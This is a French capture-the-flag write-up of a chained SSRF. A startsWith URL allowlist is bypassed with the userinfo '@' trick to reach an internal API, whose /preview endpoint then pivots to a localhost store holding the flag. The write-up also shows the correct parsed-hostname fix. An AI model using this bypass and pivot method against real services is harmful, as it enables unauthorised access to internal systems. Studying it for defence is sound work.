# SSRF chaînée — URL Parser Confusion + Internal Preview

## Objectif

Atteindre un service interne non exposé et récupérer le flag en exploitant plusieurs SSRF successives.

Le challenge indique qu'un proxy de prévisualisation n'accepte officiellement que :

```text
https://example.com
```

La vérification vulnérable est :

```js
const ALLOWED_PREFIX = "https://example.com";
if (!url.startsWith(ALLOWED_PREFIX)) reject();
const response = await axios.get(url); // follows redirects
```

Le commentaire donne déjà un gros indice :

```js
// TODO(ops): parse hostname before fetch
// internal-api still terminates TLS on :8080
```

---

# 1. Vulnérabilité principale

## Mauvaise validation d'URL

La vérification utilise :

```js
url.startsWith("https://example.com")
```

Elle compare uniquement du texte.

Elle ne vérifie pas réellement :

```text
protocol
hostname
port
```

Le bon contrôle aurait dû parser l'URL puis vérifier le vrai hostname.

---

# 2. Bypass avec `@`

Dans une URL :

```text
https://user@host/
```

la partie avant `@` correspond aux informations utilisateur.

Le vrai serveur contacté est celui situé après `@`.

Exemple conceptuel :

```text
https://example.com@internal-api:8080/
```

Pour `startsWith()` :

```text
https://example.com...
```

=> accepté.

Pour le parseur d'URL :

```text
username = example.com
hostname = internal-api
port     = 8080
```

=> la requête part vers le service interne.

Nom de la technique :

```text
SSRF
URL Parser Confusion
Userinfo @ Bypass
```

---

# 3. Premier accès à `internal-api`

URL interne atteinte :

```text
https://internal-api:8080/
```

La réponse retournait une page du service interne avec plusieurs routes intéressantes.

On y voyait notamment des endpoints comme :

```text
/health
/v1/status
/admin
/preview?url=...
```

Le service se présentait comme une API interne du cluster.

---

# 4. Exploration de `/admin`

Premier test :

```text
/admin
```

Réponse :

```json
{
  "error": "console disabled on this path",
  "hint": "ops uses /admin/debug"
}
```

Le message fournit directement une nouvelle route :

```text
/admin/debug
```

---

# 5. `/admin/debug`

La route révélait :

```json
{
  "store": "http://127.0.0.1:5432",
  "note": "http only"
}
```

Informations importantes :

```text
service = store interne
adresse = 127.0.0.1
port    = 5432
protocole = HTTP uniquement
```

Ce détail est important car notre premier bypass fonctionne dans un contexte HTTPS.

---

# 6. Découverte d'une deuxième SSRF

L'API interne exposait également une route :

```text
/preview?url=...
```

Cette route permettait au service `internal-api` de faire lui-même une requête vers une autre URL.

On obtient donc une chaîne de SSRF :

```text
/fetch
   |
   v
internal-api:8080
   |
   v
/preview?url=...
   |
   v
127.0.0.1:5432
```

C'est une :

```text
Nested SSRF
SSRF chaînée
SSRF en cascade
```

---

# 7. Accès au store interne

Le service interne répondait :

```json
{
  "name": "cluster-local docs store",
  "port": 5432,
  "note": "HTTP only"
}
```

Le service s'identifie clairement comme :

```text
cluster-local docs store
```

À partir de cette information, il fallait raisonner sur les routes probables.

---

# 8. Enumération manuelle

Plutôt que de lancer directement un bruteforce massif, on peut utiliser le vocabulaire exposé par le service.

Le nom :

```text
docs store
```

suggère naturellement des routes comme :

```text
/docs
/doc
/documents
```

Le test de :

```text
/doc
```

a permis d'avancer.

Ensuite, à partir de la structure découverte, le test de :

```text
/flag
```

a permis de récupérer le flag.

---

# 9. Chaîne complète de l'exploitation

```text
Utilisateur
   |
   | GET /fetch?url=...
   v
Proxy vulnérable
   |
   | startsWith("https://example.com")
   |
   | bypass via @
   v
https://internal-api:8080
   |
   | /admin/debug
   v
Découverte de :
http://127.0.0.1:5432
   |
   | /preview?url=...
   v
Deuxième SSRF
   |
   v
cluster-local docs store
   |
   | /doc
   | /flag
   v
FLAG
```

---

# 10. Ce qu'il fallait comprendre

## Étape 1 — Ne pas faire confiance à `startsWith()`

Ce code :

```js
url.startsWith("https://example.com")
```

ne valide pas réellement le domaine.

Une URL doit être parsée.

Exemple correct :

```js
const parsed = new URL(url);

if (
  parsed.protocol !== "https:" ||
  parsed.hostname !== "example.com"
) {
  reject();
}
```

---

## Étape 2 — Comprendre `userinfo`

Structure :

```text
scheme://userinfo@host:port/path
```

Exemple :

```text
https://example.com@internal-api:8080/
```

Le vrai host est :

```text
internal-api
```

et non :

```text
example.com
```

---

## Étape 3 — Exploiter les indices

Le challenge donnait plusieurs indices explicites :

```js
// TODO(ops): parse hostname before fetch
```

=> la validation d'URL est mauvaise.

```js
// internal-api still terminates TLS on :8080
```

=> service interne :

```text
internal-api:8080
```

Puis :

```json
{
  "hint": "ops uses /admin/debug"
}
```

=> essayer :

```text
/admin/debug
```

Puis :

```json
{
  "store": "http://127.0.0.1:5432",
  "note": "http only"
}
```

=> nouveau service interne.

Puis :

```text
cluster-local docs store
```

=> chercher des routes liées à la documentation.

---

# 11. Pourquoi la deuxième SSRF était nécessaire

Le premier point d'entrée était contraint par :

```text
https://example.com...
```

mais le store final était :

```text
http://127.0.0.1:5432
```

Donc une simple variation directe de la première URL ne suffisait pas forcément.

La route interne :

```text
/preview?url=
```

sert alors de pivot.

Elle permet à :

```text
internal-api
```

de faire lui-même la requête HTTP vers :

```text
127.0.0.1:5432
```

---

# 12. Concepts à retenir

## SSRF

Server-Side Request Forgery.

Une application vulnérable effectue une requête contrôlée par l'utilisateur.

Exemple :

```text
attaquant
   |
   v
application vulnérable
   |
   v
service interne
```

---

## URL Parser Confusion

Une application valide l'URL d'une manière différente de celle utilisée ensuite pour la requête.

Exemple :

```text
validation :
startsWith()

requête :
new URL() / axios / client HTTP
```

Les deux ne comprennent pas forcément la chaîne de la même manière.

---

## Userinfo Bypass

Syntaxe :

```text
https://userinfo@hostname/
```

Le `@` permet parfois de tromper une allowlist naïve.

---

## Nested SSRF

Une SSRF permet d'atteindre un service qui possède lui-même une fonctionnalité SSRF.

Exemple :

```text
SSRF #1
   ↓
internal-api
   ↓
SSRF #2
   ↓
localhost
```

---

# 13. Checklist pour un prochain challenge

- [ ] Lire le code de validation d'URL
- [ ] Vérifier si la validation compare une chaîne ou un vrai hostname
- [ ] Tester la syntaxe `userinfo@host`
- [ ] Regarder les commentaires TODO
- [ ] Tester les services internes suggérés
- [ ] Lire les pages racine avant de bruteforcer
- [ ] Tester `/health`
- [ ] Tester `/status`
- [ ] Tester `/admin`
- [ ] Tester `/debug`
- [ ] Regarder les hints dans les erreurs
- [ ] Repérer les IP `127.0.0.1`
- [ ] Repérer les ports internes
- [ ] Repérer les mentions HTTP / HTTPS
- [ ] Chercher une deuxième fonctionnalité fetch/preview/proxy
- [ ] Penser à une SSRF chaînée
- [ ] Utiliser les noms de services pour deviner des routes
- [ ] Énumérer manuellement avant de bruteforcer
- [ ] Documenter toute la chaîne d'exploitation

---

# Résumé ultra-court

```text
startsWith() vulnérable
        ↓
https://example.com@internal-api:8080
        ↓
/admin/debug
        ↓
http://127.0.0.1:5432
        ↓
/preview?url=...
        ↓
docs store
        ↓
/doc
        ↓
/flag
        ↓
FLAG
```

Nom de la vulnérabilité principale :

```text
SSRF — URL Parser Confusion / Userinfo @ Bypass
```

Avec ensuite :

```text
Nested SSRF / SSRF chaînée
```
